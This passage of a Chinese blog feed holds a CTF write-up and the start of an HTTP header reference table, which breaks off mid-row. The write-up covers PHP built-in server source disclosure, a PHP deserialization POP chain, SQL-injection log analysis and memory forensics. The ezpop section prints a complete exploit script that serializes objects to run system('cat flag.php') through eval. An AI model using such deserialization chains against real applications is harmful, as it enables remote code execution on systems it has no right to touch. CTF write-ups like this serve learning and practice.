    <content type="html"><![CDATA[<p>菜狗把自己写了的题目和知道的几道题的解法记录一下</p><span id="more"></span><h2 id="web"><a class="markdownIt-Anchor" href="#web">#</a> web</h2><h3 id="signin_for_web"><a class="markdownIt-Anchor" href="#signin_for_web">#</a> signin_for_web</h3><p>根据提示 php 版本很重要，所以去百度 php7.2.21 版本。</p><p>这个 Bug 存在于 PHP Built-in Server 中。PHP Built-in Server 在解析 TCP 数据流时，对于两个 HTTP 请求，在第二次请求时，如果请求一个非 PHP 后缀的文件服务器 会认为这是一个静态文件，所以将这个文件直接读取并返回。但这个过程中存在一个逻辑问 题，就是在解析第一个请求时遗留下来的 client-&gt;request.path_translated 没有被清理，而这 个变量指向的就是第一个请求的文件绝对路径。</p><p>发现该版本有远程源代码泄露的问题，根据<img src="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/clip_image002.gif" class="lazyload" data-srcset="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/clip_image002.gif" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="IMG_256"><a href="https://buaq.net/go-147962.html%E7%9A%84%E6%8F%90%E7%A4%BA%EF%BC%8C%E7%94%A8burp%E5%AF%B9%E7%BD%91%E7%AB%99%E8%BF%9B%E8%A1%8C%E6%8A%93%E5%8C%85%E3%80%81%E6%94%B9%E5%8C%85%EF%BC%8C%E8%BF%99%E5%87%A0%E4%B8%AA%E6%8D%A2%E8%A1%8C%E4%B9%9F%E6%98%AF%E9%9D%9E%E5%B8%B8%E9%87%8D%E8%A6%81%E7%9A%84%E4%B8%8D%E8%83%BD%E5%B0%91">https://buaq.net/go-147962.html 的提示，用 burp 对网站进行抓包、改包，这几个换行也是非常重要的不能少</a></p><p><img src="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/a.png" class="lazyload" data-srcset="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/a.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>改包</p><p><img src="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/b.png" class="lazyload" data-srcset="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/b.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>flag 内容 base64 加密一下就可以了</p><h3 id="ezpop"><a class="markdownIt-Anchor" href="#ezpop">#</a> ezpop</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ad1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ad2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ad1</span>(<span class="variable">$this</span>-&gt;ad2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ad1-&gt;<span class="title function_ invoke__">change</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;func . <span class="string">&#x27;Itisok&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sear</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;func-&gt;<span class="title function_ invoke__">get_flag</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$stt</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;stt-&gt;<span class="title function_ invoke__">sear</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;fine&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$args</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sear</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;args)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="variable language_">$this</span>-&gt;args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>链子为  <code>B:__destruct() -&gt; C:__toString() -&gt; B:sear() -&gt; A:__invoke() -&gt; B:__call() -&gt; D:get_flag()</code> , <code>__destruct()</code>  为起点，发现 echo，可以将类作为字符串打印，因此触发 <code>__toString()</code> ，触发  <code>__toString()</code>  后调用 <code>sear()</code> ， <code>sear()</code>  可以把类作为函数调用，触发 <code>__invoke()</code> ， <code>__invoke()</code>  中调用 了不存在的类 <code> change()</code> ，因此可以触发 <code>__call() </code> ，最后 <code>__call() </code> 调用 <code>get_flag()</code> ，进行任意代码执行。在 eval 中还有一个绕过，用换行符就行。最后注意 cat flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$ad1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$ad2</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ad1</span>(<span class="variable">$this</span>-&gt;ad2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;ad1-&gt;<span class="title function_ invoke__">change</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;func . <span class="string">&#x27;Itisok&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sear</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">(<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;func-&gt;<span class="title function_ invoke__">get_flag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$stt</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;stt-&gt;<span class="title function_ invoke__">sear</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;fine&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$args</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sear</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">(<span class="variable language_">$this</span>-&gt;args)();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="variable language_">$this</span>-&gt;args);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="title function_ invoke__">D</span>();</span><br><span class="line"><span class="variable">$b2</span>=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$b3</span>=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$d</span>-&gt;args=<span class="string">&quot;\n system(&#x27;cat flag.php&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$b3</span>-&gt;func=<span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;ad1=<span class="variable">$b3</span>;</span><br><span class="line"><span class="variable">$b2</span>-&gt;func=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;stt=<span class="variable">$b2</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;func=<span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure><p 0122a331-d077-11ed-a04c-70a8d34ece37>Flag：flag</p><h2 id="misc"><a class="markdownIt-Anchor" href="#misc">#</a> MISC</h2><h3 id="ezlog"><a class="markdownIt-Anchor" href="#ezlog">#</a> ezlog</h3><p>下载附件用 nopated++ 打开 url 解码</p><p><img src="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/c.png" class="lazyload" data-srcset="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/c.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>可以看到这是 sql 注入基于的时间注入时间同秒或者一秒这样的小差距都算是没问题的</p><p>先自己用眼睛找 flag 找了两三遍都是错的，想自己尝试写脚本但是不知道怎么入手，网上找脚本</p><p>链接：<a href="https://blog.csdn.net/qq_41420747/article/details/94147030">https://blog.csdn.net/qq_41420747/article/details/94147030</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;log.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line">req = file.readlines()</span><br><span class="line">req = req[<span class="number">275</span>:<span class="number">1842</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(req)):</span><br><span class="line">   <span class="keyword">if</span> <span class="string">&quot;[01/Mar/2019&quot;</span> <span class="keyword">in</span> req[i]:</span><br><span class="line">      <span class="keyword">if</span> <span class="built_in">abs</span>(<span class="built_in">int</span>(req[i-<span class="number">1</span>].split(<span class="string">&#x27;[01/Mar/2019&#x27;</span>)[<span class="number">1</span>][<span class="number">7</span>:<span class="number">9</span>]) - <span class="built_in">int</span>(req[i].split(<span class="string">&#x27;[01/Mar/2019&#x27;</span>)[<span class="number">1</span>][<span class="number">7</span>:<span class="number">9</span>]))&lt;<span class="number">3</span>:</span><br><span class="line">         tmp = req[i-<span class="number">1</span>].split(<span class="string">&#x27;=binary(\&#x27;&#x27;</span>)[<span class="number">1</span>][<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">         <span class="built_in">print</span>(i+<span class="number">275</span>)</span><br><span class="line">         <span class="keyword">if</span> <span class="string">&#x27;\&#x27;)&#x27;</span> <span class="keyword">in</span> tmp:</span><br><span class="line">            ans += tmp[<span class="number">0</span>]</span><br><span class="line">         <span class="keyword">else</span>:</span><br><span class="line">            ans += tmp</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure><p>把日志内容复制到 log.txt 里面就好了，跑一下脚本获取到 flag</p><p><img src="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/d.png" class="lazyload" data-srcset="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/d.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><h2 id="forensics"><a class="markdownIt-Anchor" href="#forensics">#</a> FORENSICS</h2><h3 id="signin_for_forensics"><a class="markdownIt-Anchor" href="#signin_for_forensics">#</a> signin_for_forensics</h3><p>工具 010editor-desktop、volatility<br> 先获取获取系统信息</p><p><img src="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/l.png" class="lazyload" data-srcset="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/l.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/m.png" class="lazyload" data-srcset="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/m.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>中间我还尝试查看所有文件、用户、进程都没有什么实质性的进展<br>查看浏览器记录</p><p><img src="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/e.png" class="lazyload" data-srcset="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/e.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/f.png" class="lazyload" data-srcset="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/f.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>可以看到有一个 fllllag.txt 的文件，filescan 联合 grep 获取物理地址</p><p><img src="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/n.png" class="lazyload" data-srcset="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/n.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>Dumpfiles 提取文件</p><p><img src="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/g.png" class="lazyload" data-srcset="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/g.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/i.png" class="lazyload" data-srcset="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/i.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/j.png" class="lazyload" data-srcset="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/j.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>可以看到这个目录下多了一个 file.None…… 的文件用 010editor 查看这个.dat 文件</p><p><img src="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/k.png" class="lazyload" data-srcset="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/k.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>得到 flag 直接复制</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;菜狗把自己写了的题目和知道的几道题的解法记录一下&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="https://dr4x3zz.github.io/categories/ctf/"/>
    
    
    <category term="ctf" scheme="https://dr4x3zz.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>HTTP发送头Headers整理</title>
    <link href="https://dr4x3zz.github.io/2023/04/21/HTTP%E5%8F%91%E9%80%81%E5%A4%B4Headers%E6%95%B4%E7%90%86/"/>
    <id>https://dr4x3zz.github.io/2023/04/21/HTTP%E5%8F%91%E9%80%81%E5%A4%B4Headers%E6%95%B4%E7%90%86/</id>
    <published>2023-04-20T16:51:19.000Z</published>
    <updated>2023-04-21T17:21:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>刷 buuctf 的时候遇到一道 http 1 的题目目前还没记录在博客里，里面涉及到这个知识所以归纳一下</p><span id="more"></span><p>学习链接：<a href="https://blog.csdn.net/weixin_51735061/article/details/123647266">https://blog.csdn.net/weixin_51735061/article/details/123647266</a></p><h2 id="http-请求header大全"><a class="markdownIt-Anchor" href="#http-请求header大全">#</a> http — 请求 header 大全</h2><table><thead><tr><th style="text-align:center">Header</th><th style="text-align:center">解释</th><th>示例</th></tr></thead><tbody><tr><td style="text-align:center">Accept</td><td style="text-align:center">指定客户端可以接收的内容类型</td><td>Accept: text/plain, text/html</td></tr><tr><td style="text-align:center">Accept-Charset</td><td style="text-align:center">浏览器能够接受的字符编码集。</td><td>Accept-Charset: iso-8859-5</td></tr><tr><td style="text-align:center">Accept-Encoding</td><td style="text-align:center">指定浏览器能够支持的 web 服务器返回内容压缩编码类型。</td><td>Accept-Encoding: compress, gzip</td></tr><tr><td style="text-align:center">Accept-Language</td><td style="text-align:center">浏览器可接受的语言</td><td>Accept-Language: en,zh</td></tr><tr><td style="text-align:center">Accept-Ranges</td><td style="text-align:center">能够请求网页实体的一个或者多个子范围字段</td><td>Accept-Ranges: bytes</td></tr><tr><td style="text-align:center">Authorization</td><td style="text-align:center">HTTP 受权的受权证书</td><td>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td></tr><tr><td style="text-align:center">Authorization</td><td style="text-align:center">HTTP 受权的受权证书</td><td>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td></tr><tr><td style="text-align:center">Cache-Control</td><td style="text-align:center">指定请求和响应遵循的缓存机制</td><td>Cache-Control: no-cache</td></tr><tr><td style="text-align:center">Connection</td><td style="text-align:center">表示是否须要持久链接。（HTTP 1.1 默认进行持久链接）</td><td>Connection: close</td></tr><tr><td style="text-align:center">Cookie</td><td style="text-align:center">HTTP 请求发送时，会把保存在该请求域名下的全部 cookie 值一块儿发送给 web 服务器。</td><td>Cookie: $Version=1; Skin=new;</td></tr><tr><td style="text-align:center">Content-Length</td><td style="text-align:center">请求的内容长度</td><td>Content-Length: 348</td></tr><tr><td style="text-align:center">Content-Type</td><td style="text-align:center">请求的与实体对应的 MIME 信息</td><td>Content-Type: application/x-www-form-urlencoded</td></tr><tr><td style="text-align:center">Date</td><td style="text-align:center">请求发送的日期和时间</td><td>Date: Tue, 15 Nov 2010 08:12:31 GMT</td></tr><tr><td style="text-align:center">Expect</td><td style="text-align:center">请求的特定的服务器行为</td><td>Expect: 100-continue</td></tr><tr><td style="text-align:center">From</td><td style="text-align:center">发出请求的用户的 Email</td><td>From: <a href="mailto:user@email.com">user@email.com</a></td></tr><tr><td style="text-align:center">Host</td><td style="text-align:center">指定请求的服务器的域名和端口号</td><td>Host: <a href="http://www.zcmhi.com">www.zcmhi.com</a></td></tr><tr><td style="text-align:center">If-Match</td><td style="text-align:center">只有请求内容与实体相匹配才有效</td><td>If-Match: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td style="text-align:center">If-Modified-Since</td><td style="text-align:center">若是请求的部分在指定时间以后被修改则请求成功，未被修改则返回 304 代码</td><td>If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td></tr><tr><td style="text-align:center">If-None-Match</td><td style="text-align:center">若是内容未改变返回 304 代码，参数为服务器先前发送的 Etag，与服务器回应的 Etag 比较判断是否改变</td><td>If-None-Match: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td style="text-align:center">If-Range</td><td style="text-align:center">若是实体未改变，服务器发送客户端丢失的部分，不然发送整个实体。参数也为 Etag</td><td>If-Range: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td style="text-align:center">If-Unmodified-Since</td><td style="text-align:center">只在实体在指定时间以后未被修改才请求成功</td><td>If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td></tr><tr><td style="text-align:center">If-Unmodified-Since</td><td style="text-align:center">只在实体在指定时间以后未被修改才请求成功</td><td>If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td></tr><tr><td style="text-align:center">Proxy-Authorization</td><td style="text-align:center">链接到代理的受权证书</td><td>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td></tr><tr><td style="text-align:center">Range</td><td style="text-align:center">只请求实体的一部分，指定范围</td><td>Range: bytes=500-999</td></tr><tr><td style="text-align:center">Referer</td><td style="text-align:center">先前网页的地址，当前请求网页紧随其后，即来路</td><td>Referer: <a href="http://www.zcmhi.com/archives/71.html">http://www.zcmhi.com/archives/71.html</a></td></tr><tr><td style="text-align:center">TE</td><td style="text-align:center">客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息</td><td>TE: trailers,deflate;q=0.5</td></tr><tr><td style="text-align:center">Upgrade</td><td style="text-align:center">向服务器指定某种传输协议以便服务器进行转换（若是支持）</td><td>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</td></tr><tr><td style="text-align:center">User-Agent</td><td style="text-align:center">User-Agent 的内容包含发出请求的用户信息</td><td>User-Agent: Mozilla/5.0 (Linux; X11)</td></tr><tr><td style="text-align:center">Via</td><td style="text-align:center">通知中间网关或代理服务器地址，通讯协议</td><td>Via: 1.0 fred, 1.1 <a href="http://nowhere.com">nowhere.com</a> (Apache/1.1)</td></tr><tr><td style="text-align:center">Warning</td><td style="text-align:center">关于消息实体的警告信息</td><td>Warn: 199 Miscellaneous warning</td></tr><tr><td style="text-align:center">X-Forwarded-For</td><td style="text-align:center">用来说明从哪里来的，一般用来内网伪装</td><td>X-Forwarded-For: 